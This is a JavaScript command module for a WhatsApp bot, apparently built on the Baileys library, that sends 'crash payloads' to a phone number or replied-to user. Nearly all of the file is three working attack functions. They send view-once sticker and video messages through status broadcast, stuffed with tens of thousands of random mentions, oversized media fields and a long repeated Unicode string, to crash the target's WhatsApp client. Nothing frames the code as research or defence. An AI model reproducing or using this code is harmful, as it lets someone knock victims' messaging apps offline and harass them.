import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import { getBotName, sendWithBotImage } from '../setting/botAssets.js';
import { getContextInfo } from '../setting/contextInfo.js';

export default {
    name: 'kaya-crash',
    description: '💥 Execute crash payloads on a specified target',
    category: 'Owner',

    async execute(kaya, mek, from, args, prefix) {
        try {
            const botId = kaya.user?.id ? kaya.user.id.split(':')[0].replace(/[^0-9]/g, '') : '';
            const senderJid = mek.sender || mek.key.participant || mek.key.remoteJid || '';
            const senderId = senderJid.split(':')[0].replace(/[^0-9]/g, '');
            const isOwner = senderId === botId;
            const botName = getBotName(mek.sender);

            if (!isOwner) {
                return await sendWithBotImage(kaya, from, mek.sender, { text: `❌ Only the bot owner can execute this command.` }, { quoted: mek });
            }

            let inputTarget = args[0];
            if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.participant) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.participant;
            } else if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
            }

            if (!inputTarget) {
                const usageText = `▉ \`${botName}\` ▉\n▰▰▰▰▰▰▰▰▰▰▰▰▰\n*💥 CRASH COMMAND*\n\nUsage:\n• \`${prefix}kaya-crash <phone_number>\`\n• Or reply to a user's message with \`${prefix}kaya-crash\``;
                return await sendWithBotImage(kaya, from, mek.sender, { caption: usageText, contextInfo: getContextInfo(mek.sender) }, { quoted: mek });
            }

            let target = inputTarget.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

            await kaya.sendMessage(from, { text: `⚡ Sending crash payloads to ${inputTarget}...` }, { quoted: mek });

            const gulbat = kaya;

            // ©XbatsOffc - Bulldozer Payload
            async function bulldozer(target) {
                let message = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                mimetype: "image/webp",
                                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                fileLength: { low: 1, high: 0, unsigned: true },
                                mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593,
                                },
                                stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                                isAvatar: false,
                                isAiSticker: false,
                                isLottie: false,
                            },
                        },
                    },
                };

                const msg = generateWAMessageFromContent(target, message, {});
                await gulbat.relayMessage("status@broadcast", msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }]
                    }]
                });
            }

            // Protocol Bug 3 Payload
            async function protocolbug3(target, shibal) {
                const rapip = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: {
                            videoMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                                mimetype: "video/mp4",
                                fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                                fileLength: "999999",
                                seconds: 999999,
                                mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                                caption: "(🐉) Specter Raflie X",
                                height: 999999,
                                width: 999999,
                                fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                                directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1743742853",
                                contextInfo: {
                                    isSampled: true,
                                    mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
                                },
                                streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                                thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                                thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                                thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                                annotations: [{
                                    embeddedContent: {
                                        embeddedMusic: {
                                            musicContentMediaId: "kontol",
                                            songId: "peler",
                                            author: ".Tama Ryuichi",
                                            title: "Finix",
                                            artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                            artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                            artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                            countryBlocklist: true,
                                            isExplicit: true,
                                            artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                        }
                                    },
                                    embeddedAction: null
                                }]
                            }
                        }
                    }
                }, {});
                await gulbat.relayMessage("status@broadcast", rapip.message, {
                    messageId: rapip.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }]
                    }]
                });
                if (shibal) {
                    await gulbat.relayMessage(target, {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: { key: rapip.key, type: 25 }
                            }
                        }
                    }, {
                        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                    });
                }
            }

            // Protocol Bug 5 Payload
            async function protocolbug5(isTarget, mention) {
                const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
                const embeddedMusic = {
                    musicContentMediaId: "589608164114571",
                    songId: "870166291800508",
                    author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
                    title: "Finix",
                    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
                };

                const videoMessage = {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                    fileLength: "289511",
                    seconds: 15,
                    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍄𐍉𐍂",
                    height: 640,
                    width: 640,
                    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743848703",
                    contextInfo: { isSampled: true, mentionedJid: mentionedList },
                    forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟" },
                    annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }]
                };

                const msg = generateWAMessageFromContent(isTarget, { viewOnceMessage: { message: { videoMessage } } }, {});
                await gulbat.relayMessage("status@broadcast", msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [isTarget],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }] }]
                    }]
                });

                if (mention) {
                    await gulbat.relayMessage(isTarget, {
                        groupStatusMentionMessage: {
                            message: { protocolMessage: { key: msg.key, type: 25 } }
                        }
                    }, {
                        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                    });
                }
            }

            // Exécution réelle et séquentielle des fonctions de crash
            await bulldozer(target).catch(() => {});
            await protocolbug3(target, true).catch(() => {});
            await protocolbug5(target, true).catch(() => {});

            return await kaya.sendMessage(from, { text: `✅ Crash payloads successfully dispatched to ${inputTarget}.` }, { quoted: mek });

        } catch (err) {
            console.error('❌ Error in kaya-crash:', err);
            await kaya.sendMessage(from, { text: `⚠️ An error occurred: ${err.message}` }, { quoted: mek });
        }
    }
};
